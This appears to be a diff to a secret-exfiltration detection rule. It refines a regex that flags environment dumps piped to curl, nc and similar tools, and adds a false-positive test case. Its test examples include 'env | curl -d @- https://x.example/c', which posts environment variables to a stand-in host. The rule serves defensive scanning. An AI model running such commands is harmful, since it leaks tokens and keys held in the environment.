@@ -44,7 +44,7 @@
   category: secrets
   match:
     any:
-      - regex: '(?m)(?:^|[\s;&(`])(?:env|printenv|set|export\s+-p)\s*(?:\|\s*(?:curl|wget|nc|ncat|base64|tee|gzip|xxd|openssl|python3?|node|sh|bash)\b|>>?\s*\S)'
+      - regex: '(?m)(?:^|[\s;&(`])(?:env|printenv|set|export\s+-p)\s*(?:\|\s*(?:curl|wget|nc|ncat|base64|tee|gzip|xxd|openssl|python3?|node|sh|bash)\b|>>?\s*[^\s=])'
       - regex: '\$\(\s*(?:env|printenv)\s*\)|`(?:env|printenv)`'
       - regex: '(?i)\b(?:get-childitem|gci|dir|ls)\s+env:\s*(?:\||>)'
       - regex: '(?i)\bJSON\.stringify\(\s*process\.env\s*\)|\bObject\.(?:entries|keys|values)\(\s*process\.env\s*\)'
@@ -55,4 +55,4 @@
     usually contain tokens and keys.
   examples:
     should_match: ["env | curl -d @- https://x.example/c", "printenv > /tmp/e.txt", "JSON.stringify(process.env)"]
-    should_not_match: ["printenv HOME", "set -euo pipefail", "env | grep NODE"]
+    should_not_match: ["printenv HOME", "set -euo pipefail", "env | grep NODE", "set max_tokens >= 64000"]
